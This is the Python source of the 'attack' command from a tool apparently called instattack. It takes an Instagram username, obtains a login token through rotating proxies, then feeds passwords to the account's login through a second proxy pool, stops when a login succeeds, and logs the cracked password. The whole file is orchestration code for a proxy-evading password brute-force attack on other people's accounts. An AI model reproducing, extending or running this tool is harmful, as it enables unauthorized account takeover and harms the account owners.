import asyncio
import contextlib
from plumbum import cli

from instattack.exceptions import AppException
from instattack.models import User

from instattack.lib.logger import log_handling
from instattack.lib.utils import cancel_remaining_tasks

from instattack.proxies.handlers import ProxyHandler
from instattack.instagram.handlers import TokenHandler, ResultsHandler, PasswordHandler

from .base import BaseApplication, Instattack, RequestArgs
from .proxies import ProxyArgs

import logbook

log = logbook.Logger('TEST')


@Instattack.subcommand('attack')
class InstattackAttack(BaseApplication, RequestArgs, ProxyArgs):

    __group__ = 'Instattack Attack'
    __name__ = 'Attack Command'

    _token_max_fetch_time = cli.SwitchAttr(
        "--token_max_fetch_time", float,
        default=10.0,
        group=__group__,
    )

    _pwlimit = cli.SwitchAttr(
        "--pwlimit", int,
        default=None,
        group=__group__,
    )

    def handle_exception(self, loop, context):
        """
        We are having trouble using log.exception() with exc_info=True and seeing
        the stack trace, so we have a custom log.traceback() method for now.

        >>> self.log.exception(exc, exc_info=True, extra=extra)

        Not sure if we will keep it or not, since it might add some extra
        customization availabilities, but it works right now.
        """
        extra = {}
        if 'message' in context:
            extra['other'] = context['message']

        exc = context['exception']
        self.log.traceback(exc)

        loop.run_until_complete(self.shutdown(loop))
        loop.close()

    @contextlib.contextmanager
    def loop_session(self):
        """
        TODO:
        ----
        Figure out when handle_exception is used vs. the exception
        catches... it has something to do with asyncio.gather in the coroutines
        run by loop.run_until_complete().
        """
        try:
            loop = asyncio.get_running_loop()
        except RuntimeError:
            loop = asyncio.get_event_loop()

        loop.set_exception_handler(self.handle_exception)

        try:
            yield loop
        finally:
            loop.run_until_complete(self.shutdown(loop))
            loop.close()
            return

    @log_handling('self')
    def main(self, username):
        self.user = User(username)
        self.user.setup()

        with self.loop_session() as loop:
            token = loop.run_until_complete(self.get_token(loop))
            loop.run_until_complete(self.attack(loop, token))

    async def shutdown(self, loop, signal=None):

        if signal:
            self.log.error(f'Received exit signal {signal.name}...')

        self.log.warning('[!] Shutting Down...')
        await cancel_remaining_tasks()
        loop.stop()

        self.log.notice('[!] Done')

    async def get_token(self, loop):
        """
        TODO:
        ----
        Do we really want to save proxies?

        NOTE:
        -----
        We cannot perform any actions in finally because if we hit an exception,
        the loop will have been shutdown by that point.

        It's possible that the proxy handler was not started fully before
        exception was raised - in which case we can't double stop it.

        Proxies will not be saved if it wasn't started, but that is probably
        desired behavior.
        """
        get_proxy_handler, token_handler = self.get_handlers()

        try:
            results = await asyncio.gather(
                token_handler.run(loop),
                get_proxy_handler.run(loop, prepopulate=True),
            )
        except Exception as e:
            # Do we really want to save proxies?
            if not get_proxy_handler.stopped:
                await get_proxy_handler.stop(loop, save=True)

            # We need to force the shutdown with the exception handler.
            self.handle_exception(loop, context={'exception': e})
        else:
            await get_proxy_handler.stop(loop, save=True)

            token = results[0]
            if not token:
                raise AppException("Token should not be null.")
            self.log.notice('Received Token', extra={'token': token})
            return token

    async def attack(self, loop, token):
        """
        TODO:
        ----
        Do we really want to save proxies?  If we do, we should filter out
        proxies that have a certain amount of errors.

        NOTE:
        -----
        We cannot perform any actions in finally because if we hit an exception,
        the loop will have been shutdown by that point.

        It's possible that the proxy handler was not started fully before
        exception was raised - in which case we can't double stop it.

        Proxies will not be saved if it wasn't started, but that is probably
        desired behavior.
        """
        results_handler, post_proxy_handler, password_handler = self.post_handlers(self.user)
        try:
            results = loop.run_until_complete(asyncio.gather(
                results_handler.run(loop),
                password_handler.run(loop, token, password_limit=self._pwlimit),
                post_proxy_handler.run(loop, prepopulate=True),
            ))

        except Exception as e:
            # Do we really want to save POST proxies?
            if not post_proxy_handler.stopped:
                await post_proxy_handler.stop(loop, save=True)

            # TODO: Is there a chance that the results handler or password
            # handle was already stopped?

            # Save Attempts Up Until This Point
            await results_handler.stop(loop, save=True)
            await password_handler.stop(loop)

            # We need to force the shutdown with the exception handler.
            self.handle_exception(loop, context={'exception': e})

        else:
            # TODO: Do we really want to save proxies?
            # Proxy handler should not be stopped by this point.
            await post_proxy_handler.stop(loop, save=True)

            # Save All Attempts
            await results_handler.stop(loop, save=True)
            await password_handler.stop(loop)

            # Post Proxy Server Stopped Automatically
            result = results[0]
            if result:
                self.log.notice(f'Authenticated User!', extra={
                    'password': result.context.password
                })

    def get_handlers(self):
        config = self.request_config(method='GET')
        config['token_max_fetch_time'] = self._token_max_fetch_time

        lock = asyncio.Lock()
        start_event = asyncio.Event()

        proxy_handler = ProxyHandler(
            method='GET',
            lock=lock,
            start_event=start_event,
            **self.proxy_config(method='GET')
        )
        token_handler = TokenHandler(
            proxy_handler,
            start_event=start_event,
            **config
        )
        return proxy_handler, token_handler

    def post_handlers(self, user):
        lock = asyncio.Lock()
        auth_result_found = asyncio.Event()
        results = asyncio.Queue()

        # We actually don't need to provide the lock to the password
        # and token handlers I think, since they don't access _pool directly.
        results_handler = ResultsHandler(
            user=self.user,
            queue=results,
            stop_event=auth_result_found
        )
        proxy_handler = ProxyHandler(
            method='POST',
            lock=lock,
            **self.proxy_config(method='POST')
        )
        password_handler = PasswordHandler(
            results,
            proxy_handler,
            user=self.user,
            stop_event=auth_result_found,
            **self.request_config(method='POST')
        )
        return results_handler, proxy_handler, password_handler
